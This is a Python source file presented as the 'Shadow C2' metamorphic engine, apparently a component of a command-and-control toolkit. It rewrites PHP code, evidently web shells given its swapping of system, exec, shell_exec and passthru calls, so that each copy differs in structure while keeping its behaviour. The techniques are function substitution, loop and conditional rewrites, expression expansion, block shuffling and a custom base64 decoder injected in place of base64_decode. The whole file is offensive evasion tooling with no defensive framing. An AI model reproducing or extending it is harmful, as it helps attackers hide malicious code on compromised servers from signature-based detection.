#!/usr/bin/env python3
"""
Shadow C2 — Metamorphic Engine
Deeper than polymorphic: changes actual code structure via equivalent substitutions,
loop transforms, conditional inversions, expression expansion, and block permutation.
"""

import random
import re


class MetamorphicEngine:
    """
    Metamorphic code transformation — restructures code semantics
    while preserving behavior.
    """

    # Equivalent PHP function mappings
    EXEC_EQUIVALENTS = [
        ("system", "exec"),
        ("system", "shell_exec"),
        ("system", "passthru"),
    ]

    FILE_READ_EQUIVALENTS = {
        "file_get_contents": [
            lambda var, path: f"{var} = file_get_contents({path});",
            lambda var, path: f"$_fh = fopen({path}, 'r'); {var} = fread($_fh, filesize({path})); fclose($_fh);",
            lambda var, path: f"{var} = implode('', file({path}));",
            lambda var, path: f"ob_start(); readfile({path}); {var} = ob_get_clean();",
        ],
    }

    STR_REPLACE_EQUIVALENTS = [
        lambda h, n, r: f"str_replace({n}, {r}, {h})",
        lambda h, n, r: f"preg_replace('/' . preg_quote({n}, '/') . '/', {r}, {h})",
    ]

    STRLEN_EQUIVALENTS = [
        lambda s: f"strlen({s})",
        lambda s: f"mb_strlen({s}, 'ASCII')",
        lambda s: f"count(str_split({s}))",
    ]

    def substitute_functions(self, php_code: str) -> str:
        """Replace PHP functions with equivalent alternatives."""

        # system() variants
        exec_funcs = ["system", "exec", "shell_exec", "passthru"]
        for func in exec_funcs:
            pattern = re.compile(rf'\b{func}\s*\(([^)]+)\)')
            replacement_func = random.choice(exec_funcs)
            if replacement_func == "exec":
                php_code = pattern.sub(
                    lambda m: f"exec({m.group(1)}, $_out); echo implode(\"\\n\", $_out)",
                    php_code)
            elif replacement_func == "shell_exec":
                php_code = pattern.sub(
                    lambda m: f"echo shell_exec({m.group(1)})",
                    php_code)
            elif replacement_func == "passthru":
                php_code = pattern.sub(
                    lambda m: f"passthru({m.group(1)})",
                    php_code)
            else:
                pass  # Keep as system()
            break  # Only replace one type per call to avoid loops

        # strlen() variants
        php_code = self._substitute_simple(
            php_code, r'strlen\(([^)]+)\)',
            [
                lambda m: f"mb_strlen({m.group(1)}, 'ASCII')",
                lambda m: f"count(str_split({m.group(1)}))",
            ])

        # base64_decode custom implementation
        if random.random() < 0.3:
            php_code = self._inject_custom_b64(php_code)

        return php_code

    def transform_loops(self, php_code: str) -> str:
        """Transform loop structures to equivalent forms."""

        # for -> while
        for_pattern = re.compile(
            r'for\s*\(\s*(\$\w+)\s*=\s*(\d+)\s*;\s*\1\s*<\s*(\$?\w+)\s*;\s*\1\+\+\s*\)',
            re.MULTILINE)

        def for_to_while(m):
            var = m.group(1)
            start = m.group(2)
            end = m.group(3)
            return f"{var} = {start}; while({var} < {end})"

        if random.random() < 0.5:
            php_code = for_pattern.sub(for_to_while, php_code)

        return php_code

    def invert_conditionals(self, php_code: str) -> str:
        """Swap if/else blocks and negate conditions."""
        # Simple pattern: if(cond) { A } else { B } -> if(!(cond)) { B } else { A }
        pattern = re.compile(
            r'if\s*\(([^{]+)\)\s*\{([^}]*)\}\s*else\s*\{([^}]*)\}',
            re.DOTALL)

        def invert(m):
            cond = m.group(1).strip()
            if_body = m.group(2)
            else_body = m.group(3)
            if random.random() < 0.4:
                return f"if(!({cond})) {{{else_body}}} else {{{if_body}}}"
            return m.group(0)

        return pattern.sub(invert, php_code)

    def expand_expressions(self, php_code: str) -> str:
        """Replace simple expressions with equivalent complex ones."""
        replacements = [
            # $a + $b -> $a - (-$b)
            (r'(\$\w+)\s*\+\s*(\$\w+)', r'\1 - (-\2)'),
            # $a * 2 -> $a << 1
            (r'(\$\w+)\s*\*\s*2\b', r'(\1 << 1)'),
            # $a == $b -> !($a != $b)
            (r'(\$\w+)\s*==\s*(\$\w+)', r'!(\1 != \2)'),
            # $a && $b -> !(!$a || !$b)
            (r'(\$\w+)\s*&&\s*(\$\w+)', r'!(!(\1) || !(\2))'),
            # true -> (1==1)
            (r'\btrue\b', '(1==1)'),
            # false -> (1==0)
            (r'\bfalse\b', '(1==0)'),
        ]

        for pattern, replacement in replacements:
            if random.random() < 0.3:
                php_code = re.sub(pattern, replacement, php_code, count=1)

        return php_code

    def permute_blocks(self, php_code: str) -> str:
        """Reorder independent code blocks."""
        lines = php_code.split("\n")
        blocks = []
        current_block = []
        in_func = False
        brace_depth = 0

        for line in lines:
            if re.match(r'\s*function\s+', line):
                if current_block:
                    blocks.append("\n".join(current_block))
                    current_block = []
                in_func = True
                brace_depth = 0

            current_block.append(line)

            if in_func:
                brace_depth += line.count("{") - line.count("}")
                if brace_depth <= 0 and "{" in "".join(current_block):
                    blocks.append("\n".join(current_block))
                    current_block = []
                    in_func = False

        if current_block:
            blocks.append("\n".join(current_block))

        # Only shuffle function blocks, keep non-function code in place
        func_blocks = [(i, b) for i, b in enumerate(blocks) if "function " in b]
        non_func_blocks = [(i, b) for i, b in enumerate(blocks) if "function " not in b]

        if len(func_blocks) > 1:
            indices = [i for i, _ in func_blocks]
            bodies = [b for _, b in func_blocks]
            random.shuffle(bodies)
            for idx, body in zip(indices, bodies):
                blocks[idx] = body

        return "\n".join(blocks)

    def _substitute_simple(self, php_code: str, pattern: str,
                           replacements: list) -> str:
        compiled = re.compile(pattern)
        replacement = random.choice(replacements)
        return compiled.sub(replacement, php_code, count=1)

    def _inject_custom_b64(self, php_code: str) -> str:
        """Replace base64_decode with a custom implementation."""
        custom_func = f"""
function _d($s) {{
    $t = '';
    $c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $s = preg_replace('/[^A-Za-z0-9+\\/]/', '', $s);
    $l = strlen($s);
    for($i = 0; $i < $l; $i += 4) {{
        $b = 0;
        for($j = 0; $j < 4 && ($i+$j) < $l; $j++) {{
            $b = ($b << 6) | strpos($c, $s[$i+$j]);
        }}
        $t .= chr(($b >> 16) & 0xFF);
        if(($i+2) < $l) $t .= chr(($b >> 8) & 0xFF);
        if(($i+3) < $l) $t .= chr($b & 0xFF);
    }}
    return $t;
}}"""
        if "base64_decode" in php_code:
            php_code = php_code.replace("base64_decode(", "_d(", 1)
            # Inject function after <?php
            php_code = php_code.replace("<?php", "<?php\n" + custom_func, 1)
        return php_code

    def apply_all(self, php_code: str) -> str:
        """Apply a random subset of metamorphic transformations."""
        transforms = [
            self.substitute_functions,
            self.transform_loops,
            self.invert_conditionals,
            self.expand_expressions,
            self.permute_blocks,
        ]
        random.shuffle(transforms)
        # Apply 2-4 random transforms
        count = random.randint(2, min(4, len(transforms)))
        for transform in transforms[:count]:
            php_code = transform(php_code)
        return php_code
